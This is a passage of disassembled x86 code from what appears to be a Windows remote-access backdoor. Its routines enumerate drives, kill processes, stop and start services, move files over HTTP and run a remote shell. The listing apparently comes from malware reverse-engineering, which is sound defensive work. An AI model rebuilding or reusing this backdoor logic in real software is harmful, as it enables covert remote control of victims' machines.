.text:00402124 push    offset String2  ; 24
.text:00402129 push    eax             ; 24
.text:0040212A mov     [ebp+var_13], bl ; 24
.text:0040212D call    ds:lstrcatA     ; 24
.text:00402133 lea     eax, [ebp+String1] ; 24
.text:00402136 push    eax             ; 24
.text:00402137 call    ds:GetDriveTypeA ; 24
.text:0040213D sub     eax, ebx        ; 24
.text:0040213F jz      short loc_40217D ; 24 Flows to: 25, 37
.text:00402141 dec     eax             ; 25
.text:00402142 jz      short loc_402176 ; 25 Flows to: 26, 36
.text:00402144 dec     eax             ; 26
.text:00402145 jz      short loc_40216F ; 26 Flows to: 27, 35
.text:00402147 dec     eax             ; 27
.text:00402148 jz      short loc_402168 ; 27 Flows to: 28, 34
.text:0040214A dec     eax             ; 28
.text:0040214B jz      short loc_402161 ; 28 Flows to: 29, 33
.text:0040214D dec     eax             ; 29
.text:0040214E jz      short loc_40215A ; 29 Flows to: 30, 32
.text:00402150 dec     eax             ; 30
.text:00402151 jnz     short loc_40218A ; 30 Flows to: 31, 39
.text:00402153 push    offset aRamdisk ; 31
.text:00402158 jmp     short loc_402182 ; 31 Flows to: 38
.text:0040215A
.text:0040215A loc_40215A:             ; 32
.text:0040215A push    offset aCdRom
.text:0040215F jmp     short loc_402182 ; 32 Flows to: 38
.text:00402161
.text:00402161 loc_402161:             ; 33
.text:00402161 push    offset aRemote
.text:00402166 jmp     short loc_402182 ; 33 Flows to: 38
.text:00402168
.text:00402168 loc_402168:             ; 34
.text:00402168 push    offset aFixed
.text:0040216D jmp     short loc_402182 ; 34 Flows to: 38
.text:0040216F
.text:0040216F loc_40216F:             ; 35
.text:0040216F push    offset aRemoveable
.text:00402174 jmp     short loc_402182 ; 35 Flows to: 38
.text:00402176
.text:00402176 loc_402176:             ; 36
.text:00402176 push    offset aInvalid
.text:0040217B jmp     short loc_402182 ; 36 Flows to: 38
.text:0040217D
.text:0040217D loc_40217D:             ; 37 Flows to: 38
.text:0040217D push    offset aUnkown
.text:00402182
.text:00402182 loc_402182:             ; 38
.text:00402182 push    edi
.text:00402183 call    strcat          ; 38
.text:00402188 pop     ecx             ; 38
.text:00402189 pop     ecx             ; 38 Flows to: 39
.text:0040218A
.text:0040218A loc_40218A:             ; 39
.text:0040218A push    ebx
.text:0040218B push    ebx             ; 39
.text:0040218C push    ebx             ; 39
.text:0040218D push    ebx             ; 39
.text:0040218E push    ebx             ; 39
.text:0040218F lea     eax, [ebp+VolumeNameBuffer] ; 39
.text:00402195 push    105h            ; 39
.text:0040219A push    eax             ; 39
.text:0040219B lea     eax, [ebp+String1] ; 39
.text:0040219E push    eax             ; 39
.text:0040219F call    ds:GetVolumeInformationA ; 39
.text:004021A5 test    eax, eax        ; 39
.text:004021A7 jz      short loc_4021B8 ; 39 Flows to: 40, 41
.text:004021A9 lea     eax, [ebp+VolumeNameBuffer] ; 40
.text:004021AF push    eax             ; 40
.text:004021B0 push    edi             ; 40
.text:004021B1 call    strcat          ; 40
.text:004021B6 pop     ecx             ; 40
.text:004021B7 pop     ecx             ; 40 Flows to: 41
.text:004021B8
.text:004021B8 loc_4021B8:             ; 41
.text:004021B8 push    offset asc_4050A0
.text:004021BD push    edi             ; 41
.text:004021BE call    strcat          ; 41
.text:004021C3 inc     [ebp+hSCObject] ; 41
.text:004021C6 pop     ecx             ; 41
.text:004021C7 pop     ecx             ; 41 Flows to: 42
.text:004021C8
.text:004021C8 loc_4021C8:             ; 42
.text:004021C8 shr     [ebp+ServicesReturned], 1
.text:004021CB inc     [ebp+var_1]     ; 42
.text:004021CE jmp     loc_4020E5      ; 42 Flows to: 22
.text:004021D3
.text:004021D3 loc_4021D3:             ; 43
.text:004021D3 push    [ebp+hSCObject]
.text:004021D6 lea     eax, [ebp+Dest] ; 43
.text:004021DC push    offset aTotallyDVolume ; 43
.text:004021E1 push    eax             ; 43
.text:004021E2 call    esi ; sprintf   ; 43
.text:004021E4 lea     eax, [ebp+Dest] ; 43
.text:004021EA push    eax             ; 43
.text:004021EB push    edi             ; 43
.text:004021EC call    strcat          ; 43
.text:004021F1 add     esp, 14h        ; 43 Flows to: 44
.text:004021F4
.text:004021F4 loc_4021F4:             ; 44
.text:004021F4 pop     edi
.text:004021F5 pop     esi             ; 44
.text:004021F6 pop     ebx             ; 44
.text:004021F7 leave                   ; 44
.text:004021F8 retn                    ; 44
.text:004021F8 sub_401ED9 endp
.text:004021F8
.text:004021F9
.text:004021F9
.text:004021F9 ; Attributes: bp-based frame
.text:004021F9
.text:004021F9 ; int __cdecl sub_4021F9(char *Dest)
.text:004021F9 sub_4021F9 proc near
.text:004021F9
.text:004021F9 ServiceStatus= _SERVICE_STATUS ptr -20h
.text:004021F9 var_4= dword ptr -4
.text:004021F9 Dest= dword ptr  8
.text:004021F9
.text:004021F9 push    ebp             ; 1
.text:004021FA mov     ebp, esp        ; 1
.text:004021FC sub     esp, 20h        ; 1
.text:004021FF push    ebx             ; 1
.text:00402200 xor     ebx, ebx        ; 1
.text:00402202 cmp     lpServiceName, ebx ; 1
.text:00402208 push    esi             ; 1
.text:00402209 push    edi             ; 1
.text:0040220A jnz     short loc_402213 ; 1 Flows to: 2, 3
.text:0040220C push    offset aSyntaxErrorUsa_0 ; 2
.text:00402211 jmp     short loc_40226A ; 2 Flows to: 8
.text:00402213
.text:00402213 loc_402213:             ; 3
.text:00402213 push    Str
.text:00402219 mov     esi, ds:_strcmpi ; 3
.text:0040221F push    offset aP       ; 3
.text:00402224 call    esi ; _strcmpi  ; 3
.text:00402226 pop     ecx             ; 3
.text:00402227 test    eax, eax        ; 3
.text:00402229 pop     ecx             ; 3
.text:0040222A jnz     short loc_402280 ; 3 Flows to: 4, 10
.text:0040222C push    lpServiceName   ; 4
.text:00402232 call    ds:atoi         ; 4
.text:00402238 pop     ecx             ; 4
.text:00402239 push    eax             ; 4
.text:0040223A push    ebx             ; 4
.text:0040223B push    1F0FFFh         ; 4
.text:00402240 call    ds:OpenProcess  ; 4
.text:00402246 mov     esi, eax        ; 4
.text:00402248 cmp     esi, 0FFFFFFFFh ; 4
.text:0040224B jz      short loc_402260 ; 4 Flows to: 5, 6
.text:0040224D push    1               ; 5
.text:0040224F push    esi             ; 5
.text:00402250 call    ds:TerminateProcess ; 5
.text:00402256 push    esi             ; 5
.text:00402257 mov     [ebp+var_4], eax ; 5
.text:0040225A call    ds:CloseHandle  ; 5 Flows to: 6
.text:00402260
.text:00402260 loc_402260:             ; 6
.text:00402260 cmp     [ebp+var_4], ebx
.text:00402263 jz      short loc_402279 ; 6 Flows to: 7, 9
.text:00402265 push    offset aOk      ; 7 Flows to: 8
.text:0040226A
.text:0040226A loc_40226A:             ; 8
.text:0040226A push    [ebp+Dest]
.text:0040226D call    strcat          ; 8
.text:00402272 pop     ecx             ; 8
.text:00402273 pop     ecx             ; 8
.text:00402274 jmp     loc_402354      ; 8 Flows to: 30
.text:00402279
.text:00402279 loc_402279:             ; 9
.text:00402279 push    offset aFailed
.text:0040227E jmp     short loc_40226A ; 9 Flows to: 8
.text:00402280
.text:00402280 loc_402280:             ; 10
.text:00402280 push    Str
.text:00402286 push    offset aS       ; 10
.text:0040228B call    esi ; _strcmpi  ; 10
.text:0040228D pop     ecx             ; 10
.text:0040228E test    eax, eax        ; 10
.text:00402290 pop     ecx             ; 10
.text:00402291 jnz     loc_402354      ; 10 Flows to: 11, 30
.text:00402297 push    4               ; 11
.text:00402299 push    ebx             ; 11
.text:0040229A push    ebx             ; 11
.text:0040229B call    ds:OpenSCManagerA ; 11
.text:004022A1 mov     edi, eax        ; 11
.text:004022A3 cmp     edi, ebx        ; 11
.text:004022A5 jnz     short loc_4022AE ; 11 Flows to: 12, 13
.text:004022A7 push    offset aOpenscmanagerF ; 12
.text:004022AC jmp     short loc_40226A ; 12 Flows to: 8
.text:004022AE
.text:004022AE loc_4022AE:             ; 13
.text:004022AE push    0F003Fh
.text:004022B3 push    lpServiceName   ; 13
.text:004022B9 push    edi             ; 13
.text:004022BA call    ds:OpenServiceA ; 13
.text:004022C0 mov     esi, eax        ; 13
.text:004022C2 cmp     esi, ebx        ; 13
.text:004022C4 jnz     short loc_4022F2 ; 13 Flows to: 14, 18
.text:004022C6 call    ds:GetLastError ; 14
.text:004022CC cmp     eax, 424h       ; 14
.text:004022D1 jnz     short loc_4022DA ; 14 Flows to: 15, 16
.text:004022D3 push    offset aServiceDoesNot ; 15
.text:004022D8 jmp     short loc_4022DF ; 15 Flows to: 17
.text:004022DA
.text:004022DA loc_4022DA:             ; 16 Flows to: 17
.text:004022DA push    offset aOpenserviceFai
.text:004022DF
.text:004022DF loc_4022DF:             ; 17
.text:004022DF push    [ebp+Dest]
.text:004022E2 call    strcat          ; 17
.text:004022E7 pop     ecx             ; 17
.text:004022E8 pop     ecx             ; 17
.text:004022E9 push    edi             ; 17
.text:004022EA call    ds:CloseServiceHandle ; 17
.text:004022F0 jmp     short loc_402354 ; 17 Flows to: 30
.text:004022F2
.text:004022F2 loc_4022F2:             ; 18
.text:004022F2 lea     eax, [ebp+ServiceStatus]
.text:004022F5 push    eax             ; 18
.text:004022F6 push    1               ; 18
.text:004022F8 push    esi             ; 18
.text:004022F9 call    ds:ControlService ; 18
.text:004022FF test    eax, eax        ; 18
.text:00402301 jz      short loc_402325 ; 18 Flows to: 19, 25
.text:00402303 mov     eax, [ebp+ServiceStatus.dwCurrentState] ; 19
.text:00402306 dec     eax             ; 19
.text:00402307 jz      short loc_40231E ; 19 Flows to: 20, 24
.text:00402309 dec     eax             ; 20
.text:0040230A dec     eax             ; 20
.text:0040230B jz      short loc_402317 ; 20 Flows to: 21, 23
.text:0040230D dec     eax             ; 21
.text:0040230E jnz     short loc_402348 ; 21 Flows to: 22, 29
.text:00402310 push    offset aServiceStillRu ; 22
.text:00402315 jmp     short loc_40233E ; 22 Flows to: 28
.text:00402317
.text:00402317 loc_402317:             ; 23
.text:00402317 push    offset aServiceStopPen
.text:0040231C jmp     short loc_40233E ; 23 Flows to: 28
.text:0040231E
.text:0040231E loc_40231E:             ; 24
.text:0040231E push    offset aServiceStopped
.text:00402323 jmp     short loc_40233E ; 24 Flows to: 28
.text:00402325
.text:00402325 loc_402325:             ; 25
.text:00402325 call    ds:GetLastError
.text:0040232B cmp     eax, 426h       ; 25
.text:00402330 jnz     short loc_402339 ; 25 Flows to: 26, 27
.text:00402332 push    offset aServiceDoesnTS ; 26
.text:00402337 jmp     short loc_40233E ; 26 Flows to: 28
.text:00402339
.text:00402339 loc_402339:             ; 27 Flows to: 28
.text:00402339 push    offset aControlservice
.text:0040233E
.text:0040233E loc_40233E:             ; 28
.text:0040233E push    [ebp+Dest]
.text:00402341 call    strcat          ; 28
.text:00402346 pop     ecx             ; 28
.text:00402347 pop     ecx             ; 28 Flows to: 29
.text:00402348
.text:00402348 loc_402348:             ; 29
.text:00402348 push    esi
.text:00402349 mov     esi, ds:CloseServiceHandle ; 29
.text:0040234F call    esi ; CloseServiceHandle ; 29
.text:00402351 push    edi             ; 29
.text:00402352 call    esi ; CloseServiceHandle ; 29 Flows to: 30
.text:00402354
.text:00402354 loc_402354:             ; 30
.text:00402354 pop     edi
.text:00402355 pop     esi             ; 30
.text:00402356 pop     ebx             ; 30
.text:00402357 leave                   ; 30
.text:00402358 retn                    ; 30
.text:00402358 sub_4021F9 endp
.text:00402358
.text:00402359
.text:00402359
.text:00402359 ; Attributes: bp-based frame
.text:00402359
.text:00402359 ; DWORD __stdcall StartAddress(LPVOID lpThreadParameter)
.text:00402359 StartAddress proc near
.text:00402359
.text:00402359 Str= byte ptr -28Ch
.text:00402359 Dest= byte ptr -18Ch
.text:00402359 var_88= byte ptr -88h
.text:00402359 var_48= byte ptr -48h
.text:00402359 FileSizeHigh= dword ptr -20h
.text:00402359 lpBuffer= dword ptr -1Ch
.text:00402359 NumberOfBytesRead= dword ptr -18h
.text:00402359 var_14= dword ptr -14h
.text:00402359 hFile= dword ptr -10h
.text:00402359 var_C= dword ptr -0Ch
.text:00402359 var_4= dword ptr -4
.text:00402359 lpThreadParameter= dword ptr  8
.text:00402359
.text:00402359 mov     eax, offset loc_403A60 ; 1
.text:0040235E call    _EH_prolog      ; 1
.text:00402363 sub     esp, 280h       ; 1
.text:00402369 push    ebx             ; 1
.text:0040236A push    edi             ; 1
.text:0040236B push    0EA60h          ; 1
.text:00402370 push    1               ; 1
.text:00402372 pop     ebx             ; 1
.text:00402373 mov     eax, offset WindowName ; 1
.text:00402378 push    ebx             ; 1
.text:00402379 push    eax             ; 1
.text:0040237A push    eax             ; 1
.text:0040237B xor     edi, edi        ; 1
.text:0040237D push    offset aMozilla50 ; 1
.text:00402382 push    eax             ; 1
.text:00402383 lea     ecx, [ebp+var_48] ; 1
.text:00402386 mov     [ebp+var_14], edi ; 1
.text:00402389 call    sub_40101C      ; 1
.text:0040238E cmp     dword_4058F0, edi ; 1
.text:00402394 mov     [ebp+var_4], edi ; 1
.text:00402397 jnz     short loc_4023AD ; 1 Flows to: 2, 3
.text:00402399 push    offset aSyntaxErrorUsa_3 ; 2
.text:0040239E push    [ebp+lpThreadParameter] ; 2
.text:004023A1 call    strcat          ; 2
.text:004023A6 pop     ecx             ; 2
.text:004023A7 pop     ecx             ; 2
.text:004023A8 jmp     loc_4025B0      ; 2 Flows to: 40
.text:004023AD
.text:004023AD loc_4023AD:             ; 3
.text:004023AD push    esi
.text:004023AE mov     esi, 20000h     ; 3
.text:004023B3 push    esi             ; 3
.text:004023B4 call    ??2@YAPAXI@Z    ; 3
.text:004023B9 cmp     eax, edi        ; 3
.text:004023BB pop     ecx             ; 3
.text:004023BC mov     [ebp+lpBuffer], eax ; 3
.text:004023BF jz      loc_40259E      ; 3 Flows to: 4, 37
.text:004023C5 push    offset aPutf    ; 4
.text:004023CA push    Str2            ; 4
.text:004023D0 call    ds:_strcmpi     ; 4
.text:004023D6 pop     ecx             ; 4
.text:004023D7 test    eax, eax        ; 4
.text:004023D9 pop     ecx             ; 4
.text:004023DA jnz     short loc_4023DF ; 4 Flows to: 5, 6
.text:004023DC mov     [ebp+var_14], ebx ; 5 Flows to: 6
.text:004023DF
.text:004023DF loc_4023DF:             ; 6
.text:004023DF push    Str
.text:004023E5 lea     eax, [ebp+Dest] ; 6
.text:004023EB push    eax             ; 6
.text:004023EC call    strcpy          ; 6
.text:004023F1 cmp     [ebp+var_14], edi ; 6
.text:004023F4 pop     ecx             ; 6
.text:004023F5 pop     ecx             ; 6
.text:004023F6 jz      short loc_40242D ; 6 Flows to: 7, 10
.text:004023F8 push    5Ch             ; 7
.text:004023FA push    Str             ; 7
.text:00402400 call    ds:strrchr      ; 7
.text:00402406 pop     ecx             ; 7
.text:00402407 cmp     eax, edi        ; 7
.text:00402409 pop     ecx             ; 7
.text:0040240A jz      short loc_40241C ; 7 Flows to: 8, 9
.text:0040240C inc     eax             ; 8
.text:0040240D push    eax             ; 8
.text:0040240E lea     eax, [ebp+Dest] ; 8
.text:00402414 push    eax             ; 8
.text:00402415 call    strcpy          ; 8
.text:0040241A pop     ecx             ; 8
.text:0040241B pop     ecx             ; 8 Flows to: 9
.text:0040241C
.text:0040241C loc_40241C:             ; 9
.text:0040241C push    edi
.text:0040241D push    80h             ; 9
.text:00402422 push    2               ; 9
.text:00402424 push    edi             ; 9
.text:00402425 push    ebx             ; 9
.text:00402426 push    40000000h       ; 9
.text:0040242B jmp     short loc_40243C ; 9 Flows to: 11
.text:0040242D
.text:0040242D loc_40242D:             ; 10
.text:0040242D push    edi
.text:0040242E push    80h             ; 10
.text:00402433 push    3               ; 10
.text:00402435 push    edi             ; 10
.text:00402436 push    ebx             ; 10
.text:00402437 push    80000000h       ; 10 Flows to: 11
.text:0040243C
.text:0040243C loc_40243C:             ; 11
.text:0040243C lea     eax, [ebp+Dest]
.text:00402442 push    eax             ; 11
.text:00402443 call    ds:CreateFileA  ; 11
.text:00402449 cmp     eax, 0FFFFFFFFh ; 11
.text:0040244C mov     [ebp+hFile], eax ; 11
.text:0040244F jz      loc_402592      ; 11 Flows to: 12, 36
.text:00402455 cmp     [ebp+var_14], edi ; 12
.text:00402458 jz      short loc_40246B ; 12 Flows to: 13, 14
.text:0040245A push    dword_4058EC    ; 13
.text:00402460 call    ds:atoi         ; 13
.text:00402466 pop     ecx             ; 13
.text:00402467 mov     ebx, eax        ; 13
.text:00402469 jmp     short loc_4024A2 ; 13 Flows to: 17
.text:0040246B
.text:0040246B loc_40246B:             ; 14
.text:0040246B lea     eax, [ebp+FileSizeHigh]
.text:0040246E push    eax             ; 14
.text:0040246F push    [ebp+hFile]     ; 14
.text:00402472 call    ds:GetFileSize  ; 14
.text:00402478 mov     ebx, eax        ; 14
.text:0040247A cmp     ebx, 0FFFFFFFFh ; 14
.text:0040247D jz      loc_402592      ; 14 Flows to: 15, 36
.text:00402483 cmp     [ebp+FileSizeHigh], edi ; 15
.text:00402486 jnz     loc_402592      ; 15 Flows to: 16, 36
.text:0040248C push    ebx             ; 16
.text:0040248D lea     eax, [ebp+var_88] ; 16
.text:00402493 push    offset aFilesizeD ; 16
.text:00402498 push    eax             ; 16
.text:00402499 call    ds:sprintf      ; 16
.text:0040249F add     esp, 0Ch        ; 16 Flows to: 17
.text:004024A2
.text:004024A2 loc_4024A2:             ; 17
.text:004024A2 lea     eax, [ebp+Str]
.text:004024A8 push    eax             ; 17
.text:004024A9 push    offset aS_1     ; 17
.text:004024AE push    dword_4058F0    ; 17
.text:004024B4 call    ds:sscanf       ; 17
.text:004024BA add     esp, 0Ch        ; 17
.text:004024BD lea     ecx, [ebp+var_48] ; 17
.text:004024C0 push    dword_4058F4    ; 17
.text:004024C6 call    sub_401199      ; 17
.text:004024CB lea     eax, [ebp+Str]  ; 17
.text:004024D1 lea     ecx, [ebp+var_48] ; 17
.text:004024D4 push    eax             ; 17
.text:004024D5 call    sub_4011DE      ; 17
.text:004024DA cmp     [ebp+var_14], edi ; 17
.text:004024DD jnz     short loc_4024EE ; 17 Flows to: 18, 19
.text:004024DF lea     eax, [ebp+var_88] ; 18
.text:004024E5 lea     ecx, [ebp+var_48] ; 18
.text:004024E8 push    eax             ; 18
.text:004024E9 call    sub_401280      ; 18 Flows to: 19
.text:004024EE
.text:004024EE loc_4024EE:             ; 19
.text:004024EE lea     ecx, [ebp+var_48]
.text:004024F1 call    sub_4010C0      ; 19
.text:004024F6 test    eax, eax        ; 19
.text:004024F8 jz      loc_402592      ; 19 Flows to: 20, 36
.text:004024FE mov     [ebp+lpThreadParameter], ebx ; 20 Flows to: 21
.text:00402501
.text:00402501 loc_402501:             ; 21
.text:00402501 cmp     [ebp+var_14], edi
.text:00402504 mov     [ebp+NumberOfBytesRead], edi ; 21
.text:00402507 jnz     short loc_402528 ; 21 Flows to: 22, 25
.text:00402509 cmp     [ebp+lpThreadParameter], esi ; 22
.text:0040250C mov     eax, esi        ; 22
.text:0040250E jg      short loc_402513 ; 22 Flows to: 23, 24
.text:00402510 mov     eax, [ebp+lpThreadParameter] ; 23 Flows to: 24
.text:00402513
.text:00402513 loc_402513:             ; 24
.text:00402513 lea     ecx, [ebp+NumberOfBytesRead]
.text:00402516 push    edi             ; 24
.text:00402517 sub     [ebp+lpThreadParameter], eax ; 24
.text:0040251A push    ecx             ; 24
.text:0040251B push    eax             ; 24
.text:0040251C push    [ebp+lpBuffer]  ; 24
.text:0040251F push    [ebp+hFile]     ; 24
.text:00402522 call    ds:ReadFile     ; 24 Flows to: 25
.text:00402528
.text:00402528 loc_402528:             ; 25
.text:00402528 push    [ebp+NumberOfBytesRead]
.text:0040252B lea     ecx, [ebp+var_48] ; 25
.text:0040252E push    [ebp+lpBuffer]  ; 25
.text:00402531 call    sub_4012C5      ; 25
.text:00402536 mov     ebx, eax        ; 25
.text:00402538 cmp     ebx, edi        ; 25
.text:0040253A jz      short loc_402585 ; 25 Flows to: 26, 34
.text:0040253C cmp     [ebp+var_14], edi ; 26
.text:0040253F jz      short loc_402585 ; 26 Flows to: 27, 34
.text:00402541 cmp     [ebp+lpThreadParameter], esi ; 27
.text:00402544 jg      short loc_402549 ; 27 Flows to: 28, 29
.text:00402546 mov     esi, [ebp+lpThreadParameter] ; 28 Flows to: 29
.text:00402549
.text:00402549 loc_402549:             ; 29
.text:00402549 lea     eax, [ebp+NumberOfBytesRead]
.text:0040254C lea     ecx, [ebp+var_48] ; 29
.text:0040254F push    eax             ; 29
.text:00402550 push    esi             ; 29
.text:00402551 push    [ebp+lpBuffer]  ; 29
.text:00402554 call    sub_40138F      ; 29
.text:00402559 mov     ebx, eax        ; 29
.text:0040255B cmp     ebx, edi        ; 29
.text:0040255D jz      short loc_402574 ; 29 Flows to: 30, 31
.text:0040255F mov     esi, [ebp+NumberOfBytesRead] ; 30
.text:00402562 lea     eax, [ebp+NumberOfBytesRead] ; 30
.text:00402565 push    edi             ; 30
.text:00402566 push    eax             ; 30
.text:00402567 push    esi             ; 30
.text:00402568 push    [ebp+lpBuffer]  ; 30
.text:0040256B push    [ebp+hFile]     ; 30
.text:0040256E call    ds:WriteFile    ; 30 Flows to: 31
.text:00402574
.text:00402574 loc_402574:             ; 31
.text:00402574 sub     [ebp+lpThreadParameter], esi
.text:00402577 cmp     [ebp+NumberOfBytesRead], edi ; 31
.text:0040257A jz      short loc_402580 ; 31 Flows to: 32, 33
.text:0040257C cmp     ebx, edi        ; 32
.text:0040257E jnz     short loc_402549 ; 32 Flows to: 33, 29
.text:00402580
.text:00402580 loc_402580:             ; 33 Flows to: 34
.text:00402580 mov     esi, 20000h
.text:00402585
.text:00402585 loc_402585:             ; 34
.text:00402585 cmp     [ebp+lpThreadParameter], edi
.text:00402588 jle     short loc_402592 ; 34 Flows to: 35, 36
.text:0040258A cmp     ebx, edi        ; 35
.text:0040258C jnz     loc_402501      ; 35 Flows to: 36, 21
.text:00402592
.text:00402592 loc_402592:             ; 36
.text:00402592 push    [ebp+lpBuffer]
.text:00402595 call    ??3@YAXPAX@Z    ; 36
.text:0040259A pop     ecx             ; 36
.text:0040259B push    1               ; 36
.text:0040259D pop     ebx             ; 36 Flows to: 37
.text:0040259E
.text:0040259E loc_40259E:             ; 37
.text:0040259E cmp     [ebp+hFile], 0FFFFFFFFh
.text:004025A2 pop     esi             ; 37
.text:004025A3 jz      short loc_4025AE ; 37 Flows to: 38, 39
.text:004025A5 push    [ebp+hFile]     ; 38
.text:004025A8 call    ds:CloseHandle  ; 38 Flows to: 39
.text:004025AE
.text:004025AE loc_4025AE:             ; 39 Flows to: 40
.text:004025AE mov     edi, ebx
.text:004025B0
.text:004025B0 loc_4025B0:             ; 40
.text:004025B0 or      [ebp+var_4], 0FFFFFFFFh
.text:004025B4 lea     ecx, [ebp+var_48] ; 40
.text:004025B7 call    sub_401078      ; 40
.text:004025BC mov     ecx, [ebp+var_C] ; 40
.text:004025BF mov     eax, edi        ; 40
.text:004025C1 pop     edi             ; 40
.text:004025C2 pop     ebx             ; 40
.text:004025C3 mov     large fs:0, ecx ; 40
.text:004025CA leave                   ; 40
.text:004025CB retn    4               ; 40
.text:004025CB StartAddress endp
.text:004025CB
.text:004025CE
.text:004025CE
.text:004025CE
.text:004025CE ; int __cdecl sub_4025CE(char *Dest, int)
.text:004025CE sub_4025CE proc near
.text:004025CE
.text:004025CE Dest= dword ptr  4
.text:004025CE arg_4= dword ptr  8
.text:004025CE
.text:004025CE cmp     dword_405900, 0 ; 1
.text:004025D5 push    esi             ; 1
.text:004025D6 mov     esi, [esp+4+Dest] ; 1
.text:004025DA jz      short loc_402616 ; 1 Flows to: 2, 3
.text:004025DC push    offset aShellStartedWa ; 2
.text:004025E1 push    esi             ; 2
.text:004025E2 call    strcat          ; 2
.text:004025E7 push    offset aExit    ; 2
.text:004025EC call    sub_401946      ; 2
.text:004025F1 add     esp, 0Ch        ; 2
.text:004025F4 push    0FFFFFFFFh      ; 2
.text:004025F6 push    Dst             ; 2
.text:004025FC call    ds:WaitForSingleObject ; 2
.text:00402602 and     dword_405900, 0 ; 2
.text:00402609 push    offset aOk_1    ; 2
.text:0040260E push    esi             ; 2
.text:0040260F call    strcat          ; 2
.text:00402614 pop     ecx             ; 2
.text:00402615 pop     ecx             ; 2 Flows to: 3
.text:00402616
.text:00402616 loc_402616:             ; 3
.text:00402616 push    offset aSoLong
.text:0040261B push    esi             ; 3
.text:0040261C call    strcat          ; 3
.text:00402621 push    esi             ; 3
.text:00402622 call    strlen          ; 3
.text:00402627 mov     ecx, [esp+10h+arg_4] ; 3
.text:0040262B add     esp, 0Ch        ; 3
.text:0040262E push    eax             ; 3
.text:0040262F push    esi             ; 3
.text:00402630 call    sub_4012C5      ; 3
.text:00402635 pop     esi             ; 3
.text:00402636 retn                    ; 3
.text:00402636 sub_4025CE endp
.text:00402636
.text:00402637
.text:00402637
.text:00402637 ; Attributes: bp-based frame
.text:00402637
.text:00402637 ; int __cdecl sub_402637(char *Dest)
.text:00402637 sub_402637 proc near
.text:00402637
.text:00402637 Dst= dword ptr -54h
.text:00402637 var_28= dword ptr -28h
.text:00402637 var_24= word ptr -24h
.text:00402637 ProcessInformation= _PROCESS_INFORMATION ptr -10h
.text:00402637 Dest= dword ptr  8
.text:00402637
.text:00402637 push    ebp             ; 1
.text:00402638 mov     ebp, esp        ; 1
.text:0040263A sub     esp, 54h        ; 1
.text:0040263D push    ebx             ; 1
.text:0040263E push    esi             ; 1
.text:0040263F xor     esi, esi        ; 1
.text:00402641 push    edi             ; 1
.text:00402642 cmp     lpServiceName, esi ; 1
.text:00402648 jnz     short loc_402654 ; 1 Flows to: 2, 3
.text:0040264A push    offset aSyntaxErrorUsa_1 ; 2
.text:0040264F jmp     loc_4026FF      ; 2 Flows to: 11
.text:00402654
.text:00402654 loc_402654:             ; 3
.text:00402654 push    Str
.text:0040265A mov     edi, ds:_strcmpi ; 3
.text:00402660 push    offset aP       ; 3
.text:00402665 call    edi ; _strcmpi  ; 3
.text:00402667 pop     ecx             ; 3
.text:00402668 test    eax, eax        ; 3
.text:0040266A pop     ecx             ; 3
.text:0040266B jnz     short loc_4026D3 ; 3 Flows to: 4, 8
.text:0040266D push    44h             ; 4
.text:0040266F lea     eax, [ebp+Dst]  ; 4
.text:00402672 pop     edi             ; 4
.text:00402673 push    edi             ; 4
.text:00402674 push    esi             ; 4
.text:00402675 push    eax             ; 4
.text:00402676 call    memset          ; 4
.text:0040267B add     esp, 0Ch        ; 4
.text:0040267E lea     ecx, [ebp+ProcessInformation] ; 4
.text:00402681 mov     [ebp+Dst], edi  ; 4
.text:00402684 mov     [ebp+var_24], si ; 4
.text:00402688 push    1               ; 4
.text:0040268A pop     eax             ; 4
.text:0040268B push    ecx             ; 4
.text:0040268C lea     ecx, [ebp+Dst]  ; 4
.text:0040268F push    ecx             ; 4
.text:00402690 push    esi             ; 4
.text:00402691 push    esi             ; 4
.text:00402692 push    esi             ; 4
.text:00402693 push    eax             ; 4
.text:00402694 push    esi             ; 4
.text:00402695 push    esi             ; 4
.text:00402696 mov     [ebp+var_28], eax ; 4
.text:00402699 push    lpServiceName   ; 4
.text:0040269F push    esi             ; 4
.text:004026A0 call    ds:CreateProcessA ; 4
.text:004026A6 test    eax, eax        ; 4
.text:004026A8 jz      short loc_4026B1 ; 4 Flows to: 5, 6
.text:004026AA push    offset aProgramStarted ; 5
.text:004026AF jmp     short loc_4026B6 ; 5 Flows to: 7
.text:004026B1
.text:004026B1 loc_4026B1:             ; 6 Flows to: 7
.text:004026B1 push    offset aCreateprocessF
.text:004026B6
.text:004026B6 loc_4026B6:             ; 7
.text:004026B6 push    [ebp+Dest]
.text:004026B9 call    strcat          ; 7
.text:004026BE mov     esi, ds:CloseHandle ; 7
.text:004026C4 pop     ecx             ; 7
.text:004026C5 pop     ecx             ; 7
.text:004026C6 push    [ebp+ProcessInformation.hProcess] ; 7
.text:004026C9 call    esi ; CloseHandle ; 7
.text:004026CB push    [ebp+ProcessInformation.hThread] ; 7
.text:004026CE jmp     loc_402793      ; 7 Flows to: 23
.text:004026D3
.text:004026D3 loc_4026D3:             ; 8
.text:004026D3 push    Str
.text:004026D9 push    offset aS       ; 8
.text:004026DE call    edi ; _strcmpi  ; 8
.text:004026E0 pop     ecx             ; 8
.text:004026E1 test    eax, eax        ; 8
.text:004026E3 pop     ecx             ; 8
.text:004026E4 jnz     loc_402795      ; 8 Flows to: 9, 24
.text:004026EA push    4               ; 9
.text:004026EC push    esi             ; 9
.text:004026ED push    esi             ; 9
.text:004026EE call    ds:OpenSCManagerA ; 9
.text:004026F4 mov     ebx, eax        ; 9
.text:004026F6 cmp     ebx, esi        ; 9
.text:004026F8 jnz     short loc_40270E ; 9 Flows to: 10, 12
.text:004026FA push    offset aOpenscmanagerF ; 10 Flows to: 11
.text:004026FF
.text:004026FF loc_4026FF:             ; 11
.text:004026FF push    [ebp+Dest]
.text:00402702 call    strcat          ; 11
.text:00402707 pop     ecx             ; 11
.text:00402708 pop     ecx             ; 11
.text:00402709 jmp     loc_402795      ; 11 Flows to: 24
.text:0040270E
.text:0040270E loc_40270E:             ; 12
.text:0040270E push    0F003Fh
.text:00402713 push    lpServiceName   ; 12
.text:00402719 push    ebx             ; 12
.text:0040271A call    ds:OpenServiceA ; 12
.text:00402720 mov     edi, eax        ; 12
.text:00402722 cmp     edi, esi        ; 12
.text:00402724 jnz     short loc_402752 ; 12 Flows to: 13, 17
.text:00402726 call    ds:GetLastError ; 13
.text:0040272C cmp     eax, 424h       ; 13
.text:00402731 jnz     short loc_40273A ; 13 Flows to: 14, 15
.text:00402733 push    offset aServiceDoesNot ; 14
.text:00402738 jmp     short loc_40273F ; 14 Flows to: 16
.text:0040273A
.text:0040273A loc_40273A:             ; 15 Flows to: 16
.text:0040273A push    offset aStartserviceFa
.text:0040273F
